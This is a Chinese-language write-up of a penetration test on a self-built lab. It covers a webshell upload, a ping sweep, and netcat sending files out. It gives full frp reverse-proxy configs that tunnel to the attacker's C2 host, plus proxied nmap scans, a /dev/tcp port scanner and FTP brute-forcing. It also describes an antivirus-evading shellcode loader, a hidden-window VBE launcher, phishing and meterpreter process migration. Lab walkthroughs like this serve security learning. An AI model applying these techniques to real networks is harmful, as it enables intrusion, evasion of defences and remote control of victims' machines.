> 本次渗透测试初衷是自建靶场，研究下内网流量代理及免杀马钓鱼，初步测试完后索性多做几步，形成一个较为完整的全流程渗透过程。
>
> 郑重申明：本文分享的所有信息技术仅用于学习教育之目的，所有攻击目标均为笔者自行搭建，如文中技术被应用于任何其他目标，本人概不负责。如需转载，请注明出处！

## 模拟环境

![1609520339_5fef54d3a5c21837f05d4.png!small?1609520339989](https://image.3001.net/images/20210102/1609520339_5fef54d3a5c21837f05d4.png!small?1609520339989)

`C2攻击机-kali：eth0 192.168.66.128`

`企业公网入口-web服务器win10：eth0 192.168.66.132/eth1 192.168.67.132`

`企业内网-内网主机win10：eth1 192.168.67.133`

## 最终目标

拿下web服务器权限，通过web服务器流量转发及免杀马内网钓鱼，实现C2客户端对内网主机的远控。

## 渗透过程

### webshell获取

web服务存在上传漏洞(毕竟是文件上传靶场 )，php马上传获取webshell

![1609520839_5fef56c74d327a21af93b.png!small?1609520839639](https://image.3001.net/images/20210102/1609520839_5fef56c74d327a21af93b.png!small?1609520839639)

![1609520836_5fef56c456cf7bf6b918c.png!small?1609520839639](https://image.3001.net/images/20210102/1609520836_5fef56c456cf7bf6b918c.png!small?1609520839639)

### 内网流量转发

web服务器存在两张网卡eth0 eth1，推测存在内部网络，网段192.168.67.0/24

![1609520855_5fef56d7d0cb34a4b805d.png!small?1609520856128](https://image.3001.net/images/20210102/1609520855_5fef56d7d0cb34a4b805d.png!small?1609520856128)

cmd ping全网段

`@for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.67.%i & if errorlevel 1
(echo 192.168.67.%i>>na.txt) else (echo 192.168.67.%i>>act.txt)`

继续利用上传漏洞，上传netcat（假使它不会被杀掉
）,使用nc传回act.txt（考虑免杀，也可以利用weevely自带的download模块下载文件到本地）

![1609520846_5fef56ce991f2bbac9416.png!small?1609520856128](https://image.3001.net/images/20210102/1609520846_5fef56ce991f2bbac9416.png!small?1609520856128)

![1609520851_5fef56d3bf49a09a0fe7b.png!small?1609520856128](https://image.3001.net/images/20210102/1609520851_5fef56d3bf49a09a0fe7b.png!small?1609520856128)

内网段存活主机192.168.67.133

frp 端口转发-c2攻击机要连通内网机，需web服务器做代理转发，使用frp做反向代理

![1609520854_5fef56d6097206310f235.png!small?1609520856128](https://image.3001.net/images/20210102/1609520854_5fef56d6097206310f235.png!small?1609520856128)

nc传frp_win_amd64至跳板机，c2攻击机使用frp_linux_amd64与之通信

![1609520860_5fef56dcbd0b8e7f0374f.png!small?1609520861308](https://image.3001.net/images/20210102/1609520860_5fef56dcbd0b8e7f0374f.png!small?1609520861308)

![1609520861_5fef56dd0b4aa746760cc.png!small?1609520861309](https://image.3001.net/images/20210102/1609520861_5fef56dd0b4aa746760cc.png!small?1609520861309)

上传unzip.exe，cmd解压文件夹

![1609520865_5fef56e134bcf546923df.png!small?1609520865443](https://image.3001.net/images/20210102/1609520865_5fef56e134bcf546923df.png!small?1609520865443)

frp client(跳板机)&server(攻击机)配置如下：

server端开启本地7000端口监听，连接密钥设置为pick；client设置远程连接目标IP及端口，设置密钥（与server相同）,设置连接端口协议为tcp，本地端口3334，连接目标端口3335，设置socks5代理，使得不同协议流量可以使用绑定端口通信。

    
    
    #服务端
    ##设置连接端口及连接密钥
    root@kali:~/frp_0.34.3_linux_amd64# cat frps.ini 
    [common]
    bind_port = 7000
    token=pick
    
    #客户端(建议本地修改完上传)
    ##设置连接目标(攻击机)ip:port及连接密码
    ##设置端口协议
    C:\\xxx\\upload\\frp_0.34.3_windows_amd64>type frpc.ini
    type frpc.ini
    [common]
    server_addr = 192.168.66.128
    server_port = 7000
    token=pick
    
    [haha]
    type = tcp
    local_ip = 127.0.0.1
    local_port = 3334
    remote_port = 3335
    plugin=socks5
    

启动frpc&s

    
    
    #服务端
    ./frps -c frps.ini 
    #客户端
    .\\frpc.exe -c frpc.ini
    

本地使用proxychains作流量代理，配置如下

![1609520876_5fef56ec2e057b9682ac8.png!small?1609520876567](https://image.3001.net/images/20210102/1609520876_5fef56ec2e057b9682ac8.png!small?1609520876567)

bingo，telnet成功连接到内网主机开启端口，流量代理成功

![1609520881_5fef56f1e570117487c9f.png!small?1609520882289](https://image.3001.net/images/20210102/1609520881_5fef56f1e570117487c9f.png!small?1609520882289)

### 走代理的端口扫描

使用nmap走代理扫描

![1609520884_5fef56f407fec611c91b3.png!small?1609520884393](https://image.3001.net/images/20210102/1609520884_5fef56f407fec611c91b3.png!small?1609520884393)

显示主机ping不通，因为socks没法代理icmp流量

![1609520887_5fef56f79d0e3d4c3352b.png!small?1609520888045](https://image.3001.net/images/20210102/1609520887_5fef56f79d0e3d4c3352b.png!small?1609520888045)

加-Pn，不检测主机存活，结果如下

![1609520897_5fef570191d1b090ce8db.png!small?1609520902268](https://image.3001.net/images/20210102/1609520897_5fef570191d1b090ce8db.png!small?1609520902268)

扫描结果与主机实际端口开启情况不符，-Pn扫描任意不存在主机都是这个结果，如下图通过本地代理连接到扫出来的open port均超时。

![1609520901_5fef5705ed98d307107f6.png!small?1609520902268](https://image.3001.net/images/20210102/1609520901_5fef5705ed98d307107f6.png!small?1609520902268)

那么正确的扫描姿势是什么呢？前面已经尝试过了，使用telnet是可以正常连接21端口的，换而言之，tcp三次握手是可以走代理完成的，那么指定nmap使用tcp全连接模式试试，加-sT参数

![1609520901_5fef57054afd41f1be5c3.png!small?1609520902268](https://image.3001.net/images/20210102/1609520901_5fef57054afd41f1be5c3.png!small?1609520902268)![1609520915_5fef5713d08f442c0c90d.png!small?1609520923730](https://image.3001.net/images/20210102/1609520915_5fef5713d08f442c0c90d.png!small?1609520923730)

bingo,成功扫描到内网主机端口信息!（记得stderr丢到位桶，不然会输出接近1000行的连接timeout ）

其实如果nmap用不好（说的就是你，渗透带师 ），65535次tcp连接测试也不失为一种解决方法，下面是来自热心网友的demo（原谅我，没找到原文链接
）。原理是利用了bash的网络请求接口`/dev/tcp`，`echo > /dev/tcp/IP/PORT`会向IP:PORT发起连接。

    
    
    #!/bin/bash
    
    PORT_LIST="445 443 135 6000 6001 6002 6003 21 6004 6005 6006 6007 6008 6009 6010"
    REMOTE_HOST=192.168.67.133
    TIMEOUT_SEC=5
    
    for PORT in $PORT_LIST
    do
        timeout $TIMEOUT_SEC bash -c "</dev/tcp/$REMOTE_HOST/$PORT" &>/dev/null; res=$?
        if [[ $res -eq 0 ]]
        then
            echo "$PORT OPEN"
        elif [[ $res -eq 1 ]]
        then
            echo "$PORT OPEN BUT NOT LISTEN"
        elif [[ $res -eq 124 ]]
        then
            echo "$PORT NOT OPEN"
        else
            echo "$PORT UNKONWN ERROR"
        fi
    done
    

nmap探测发现内网主机开启ftp服务，hydra爆破

![1609520923_5fef571b5508d25115eaa.png!small?1609520923731](https://image.3001.net/images/20210102/1609520923_5fef571b5508d25115eaa.png!small?1609520923731)

![1609521125_5fef57e5e67f6f686761c.png!small?1609521126175](https://image.3001.net/images/20210102/1609521125_5fef57e5e67f6f686761c.png!small?1609521126175)登陆成功，但执行命令报错

![1609520928_5fef57203ab99cbdd18ce.png!small?1609520928520](https://image.3001.net/images/20210102/1609520928_5fef57203ab99cbdd18ce.png!small?1609520928520)

浏览器访问ftp服务器可以正常上传下载

![1609520934_5fef57261d96d134716d5.png!small?1609520934475](https://image.3001.net/images/20210102/1609520934_5fef57261d96d134716d5.png!small?1609520934475)

上传木马，钓鱼内网主机

### 分离免杀马

钓鱼的恶意程序得做下免杀了，不然评论区要说我水文章了。

学习过tide团队bypassAntiVirus系列文章，非常系统地介绍了公开的免杀方法原理和免杀工具使用；笔者尝试了文章中大多数免杀工具，遗憾的是均已被加入各大杀软特征库
。所以自己动手，才能丰衣足食。

这次手敲一个基础的分离免杀demo，原理是把shellcode放到txt等非PE文件里，加载器从txt中读取shellcode执行。

首先是shellcode，msfvenom直接生成即可，encoder/badchar都不用考虑，非PE文件天生免杀；要注意攻击机连通内网机是需要跳板转发的，本次试验使用meterpreter_bind_shell，msf走proxychains代理即可。

![1609521210_5fef583ad0218a159e59e.png!small?1609521211217](https://image.3001.net/images/20210102/1609521210_5fef583ad0218a159e59e.png!small?1609521211217)

然后先说shellcode的执行吧，最简单的方法是使用内联汇编实现，jmp到代码区头即可；此外还可以使用VirtualAlloc分配内存区后，将shellcode拷贝(memcpy)至内存区，定义函数指针指向内存区，执行函数即可执行shllcode;

最后关于读机器码进数组，稍微费事些。首先应使用char数组，每个成员一字节大小，正好存下一个十六进制机器码，单个数组成员太长还需考虑大小端序问题；再使用fread读一字节机器码进内存，循环拷贝给数组即可；强烈建议利用动调完成整个shellcode的加载与执行，可以免去很多弯路。

（源码或编译好的exe，后面会同步到github上，这里暂不放出）

下面是生成好的加载器loader.exe，免杀火绒/360

![1609520951_5fef5737bc91868ae30df.png!small?1609520959984](https://image.3001.net/images/20210102/1609520951_5fef5737bc91868ae30df.png!small?1609520959984)

![1609520956_5fef573cd63126b0fffba.png!small?1609520959989](https://image.3001.net/images/20210102/1609520956_5fef573cd63126b0fffba.png!small?1609520959989)

本地运行loader.exe，会加载同目录下的1.bin执行；不过运行期间会有dos窗口，可以再写个vbe脚本调用，隐藏dos

    
    
    set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run "loader.exe /start",0
    

### 内网主机上线

ftp上传loader.exe+1.bin+clickme.vbe（实际钓鱼的时候建议起个好名字 ）

![1609520950_5fef5736e5a8bc0380015.png!small?1609520959987](https://image.3001.net/images/20210102/1609520950_5fef5736e5a8bc0380015.png!small?1609520959987)

本地使用代理启msf

![1609520955_5fef573bc18ee43b9ebc6.png!small?1609520959990](https://image.3001.net/images/20210102/1609520955_5fef573bc18ee43b9ebc6.png!small?1609520959990)

设置如下

![1609520965_5fef5745e1b2c8fdcbf0b.png!small?1609520986121](https://image.3001.net/images/20210102/1609520965_5fef5745e1b2c8fdcbf0b.png!small?1609520986121)

本地启连接，静待内网机上线

![1609520965_5fef5745ec6f4a6c8cbca.png!small?1609520986121](https://image.3001.net/images/20210102/1609520965_5fef5745ec6f4a6c8cbca.png!small?1609520986121)

鱼儿上钩

![1609520985_5fef5759c5fb82f517012.png!small?1609520989710](https://image.3001.net/images/20210102/1609520985_5fef5759c5fb82f517012.png!small?1609520989710)

至此，就已经完成了本次试验的全部目标，成功上线内网主机，然后后渗透环节...要干的事就更多了，，比如咱们马的进程loader.exe随时有被kill的可能，利用meterpreter模块migrate可以很方便的完成进程迁移

查看内网机当前进程，loader.exe pid是6032，迁移到2324 onedirve.exe吧

![1609520973_5fef574d24fe143f9d3d1.png!small?1609520986121](https://image.3001.net/images/20210102/1609520973_5fef574d24fe143f9d3d1.png!small?1609520986121)

![1609520989_5fef575d61df0a4b5aa8d.png!small?1609520989711](https://image.3001.net/images/20210102/1609520989_5fef575d61df0a4b5aa8d.png!small?1609520989711)

![1609520977_5fef5751eef933fd09427.png!small?1609520989709](https://image.3001.net/images/20210102/1609520977_5fef5751eef933fd09427.png!small?1609520989709)

再看进程已经没有loader.exe了，但咱们的shell依旧稳定连接，实现了一定程度上的rootkit。

### 总结

本次自搭靶场，重点试验了流量转发、分离免杀、内网钓鱼等渗透技术，成功实现了一次整体上较为接近实际场景的渗透测试；当然也留下了很多值得琢磨的地方，比如netcat过不了杀软、如何实现此类常用hack工具的模改免杀，比如nmap走代理扫描时，-sS/-sA/-sF均失效，只有全连接生效，原因是什么，比如如何利用pdf/word实现更有效的钓鱼攻击...待笔者进一步研究后再与诸君分享。

对于内网渗透，笔者亦属于新手，日常渗透工作更偏重于外围打点；文中如有任何不当之处，还望各位不吝斧正。

